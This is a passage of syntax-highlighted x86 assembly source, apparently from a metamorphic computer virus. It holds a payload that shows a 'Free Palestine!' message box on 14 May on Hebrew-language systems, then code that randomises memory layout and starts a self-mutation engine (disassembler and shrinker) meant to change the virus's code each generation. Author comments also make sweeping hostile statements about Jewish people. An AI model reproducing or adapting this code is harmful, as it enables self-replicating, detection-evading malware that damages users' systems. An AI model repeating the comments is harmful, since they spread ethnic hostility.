                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_MessageBoxA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndPayload</span><span class="sc0">


 </span><span class="sc1">; Not so-silly 2nd part of the payload.</span><span class="sc0">
 </span><span class="sc1">; We get the system language and, if it's hebrew, we show a message box with</span><span class="sc0">
 </span><span class="sc1">; the message "Free Palestine!", my little contribution against the illegal</span><span class="sc0">
 </span><span class="sc1">; occupation performed by the jews and supported by EEUU. The message will</span><span class="sc0">
 </span><span class="sc1">; show on 14 May, the day that the state of Israel was declarated.</span><span class="sc0">
 </span><span class="sc1">; Notice that I'm not supporting organizations like Hamas or shit like that,</span><span class="sc0">
 </span><span class="sc1">; but it's true that jews began the war stealing the Palestinian home to</span><span class="sc0">
 </span><span class="sc1">; the Palestinian People. Anyway, killing people is not the solution</span><span class="sc0">
 </span><span class="sc1">; (wherever the side of the conflict they are in).</span><span class="sc0">


   </span><span class="sc5">@@CheckPayload2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">  </span><span class="sc1">; May</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoPayload</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0"> </span><span class="sc1">; 14th</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoPayload</span><span class="sc0">                

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetSystemDefaultLCID</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040Dh</span><span class="sc0">    </span><span class="sc1">; System language: hebrew?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoPayload</span><span class="sc0">


                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'eerF'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'laP '</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'itse'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'!en'</span><span class="sc0">    </span><span class="sc1">; Show our disconformity with jewish</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; invasion of Palestine and all their</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">           </span><span class="sc1">; fascist acting up to date (in a</span><span class="sc0">
                                      </span><span class="sc1">; peaceful way)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_MessageBoxA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">@@EndPayload</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">@@NoPayload</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;; Now we are going to get random frames for variables, dissasembly, etc. for</span><span class="sc0">
</span><span class="sc1">;; the next generation usage. These variables must be passed "from the</span><span class="sc0">
</span><span class="sc1">;; outside" (as parameters from the loader/decryptor).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Sizes of frames:</span><span class="sc0">
</span><span class="sc1">;; CODE_SECTION      =  80000h</span><span class="sc0">
</span><span class="sc1">;; DISASM_SECTION    = 100000h</span><span class="sc0">
</span><span class="sc1">;;    LABEL_SECTION     =  10000h +</span><span class="sc0">
</span><span class="sc1">;;    VARIABLE_SECTION  =  10000h +</span><span class="sc0">
</span><span class="sc1">;;    BUFFER1_SECTION   =  10000h +</span><span class="sc0">
</span><span class="sc1">;;    BUFFER2_SECTION   =  10000h +</span><span class="sc0">
</span><span class="sc1">;;    VAR_MARKS_SECTION =  20000h =</span><span class="sc0">
</span><span class="sc1">;; BUFFERS_SECTION   =  60000h</span><span class="sc0">
</span><span class="sc1">;; DATA_SECTION      =  20000h</span><span class="sc0">
</span><span class="sc1">;; DISASM2_SECTION   = 100000h</span><span class="sc0">
</span><span class="sc1">;;                 -----------</span><span class="sc0">
</span><span class="sc1">;;                     300000h</span><span class="sc0">
</span><span class="sc1">;; We always reserve 3'4 Mb of virtual memory at least, so we can add a random</span><span class="sc0">
</span><span class="sc1">;; shifting up to 256 Kb (40000h bytes)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Let's fabricate a random permutation of</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">; the sequence 0,1,2,3,4,5. </span><span class="sc0">
      </span><span class="sc5">@@LoopGarbleSect_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GarbleRegisters</span><span class="sc0"> </span><span class="sc1">; Garble EBX, ECX and EDX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; Store the garbled sequence</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGarbleSect_01</span><span class="sc0"> </span><span class="sc1">; Repeat it again (get 4,5,6)</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; Now garble the &lt;0,1,2&gt; with the &lt;3,4,5&gt;</span><span class="sc0">
      </span><span class="sc5">@@LoopGarbleSect_02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get value at position 0,2,4 and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; garble it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GarbleRegisters</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; Store the shuffling</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGarbleSect_02</span><span class="sc0"> </span><span class="sc1">; Make it with positions 1,3,5</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; Initialize adder</span><span class="sc0">
      </span><span class="sc5">@@LoopGarbleSect_03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7FFFh</span><span class="sc0"> </span><span class="sc1">; *5 = 40000h ; Add a random shifting</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; 0?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GarbleSect_CodeSection</span><span class="sc0"> </span><span class="sc1">; Then set CODE_SECTION address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; 1?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GarbleSect_DisasmSection</span><span class="sc0"> </span><span class="sc1">; Then, DISASM_SECTION</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GarbleSect_BuffersSection</span><span class="sc0"> </span><span class="sc1">; 2: BUFFERS_SECTION</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GarbleSect_DataSection</span><span class="sc0">   </span><span class="sc1">; 3: DATA_SECTION</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GarbleSect_Next</span><span class="sc0">          </span><span class="sc1">; 4: DISASM2_SECTION</span><span class="sc0">
      </span><span class="sc5">@@GarbleSect_Disasm2Section</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_DISASM2_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100000h</span><span class="sc0">      </span><span class="sc1">; Add size of section to adder</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GarbleSect_Next</span><span class="sc0">
      </span><span class="sc5">@@GarbleSect_CodeSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_CODE_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000h</span><span class="sc0">       </span><span class="sc1">; Add size of section to adder</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GarbleSect_Next</span><span class="sc0">
      </span><span class="sc5">@@GarbleSect_DisasmSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_DISASM_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100000h</span><span class="sc0">      </span><span class="sc1">; Add size of section to adder</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GarbleSect_Next</span><span class="sc0">
      </span><span class="sc5">@@GarbleSect_BuffersSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_BUFFERS_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60000h</span><span class="sc0">       </span><span class="sc1">; Add size of section to adder</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GarbleSect_Next</span><span class="sc0">
      </span><span class="sc5">@@GarbleSect_DataSection</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_DATA_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20000h</span><span class="sc0">       </span><span class="sc1">; Add size of section to adder</span><span class="sc0">
      </span><span class="sc5">@@GarbleSect_Next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopGarbleSect_03</span><span class="sc0">


</span><span class="sc1">;; Now we can start with the selfmutation</span><span class="sc0">

</span><span class="sc1">;; Disassembler:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; It disassembles the code starting at ESI (entrypoint) to a pseudoassembler</span><span class="sc0">
</span><span class="sc1">;; that is easier to handle. This pseudoassembler will be used along the</span><span class="sc0">
</span><span class="sc1">;; mutation instead of the direct machine code.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                    </span><span class="sc1">; Set the address of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the instruction table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_LABEL_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                    </span><span class="sc1">; Address of the label</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LabelTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                    </span><span class="sc1">; Temporary table for the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FutureLabelTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; storadge of labels</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM2_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                    </span><span class="sc1">; Temporary buffer to mark</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PathMarksTable</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; the path of the code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CODE_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">; ESI = Start of code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DisasmCode</span><span class="sc0">              </span><span class="sc1">; Disassemble  the code</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">     </span><span class="sc1">; NOP for debugging: Place for the debugger to put the</span><span class="sc0">
                        </span><span class="sc1">; INT 3. It will be eliminated by the disassembler,</span><span class="sc0">
                        </span><span class="sc1">; since all the one-byte instructions such CLC, INT 3,</span><span class="sc0">
                        </span><span class="sc1">; etc. are NOPed</span><span class="sc0">
                </span><span class="sc1">; It returns EDI = Address of last instruction</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Set last instr.</span><span class="sc0">


</span><span class="sc1">;; Shrinker</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; It compresses all the redundancies and obfuscations that the expander did</span><span class="sc0">
</span><span class="sc1">;; in previous generations.</span><span class="sc0">

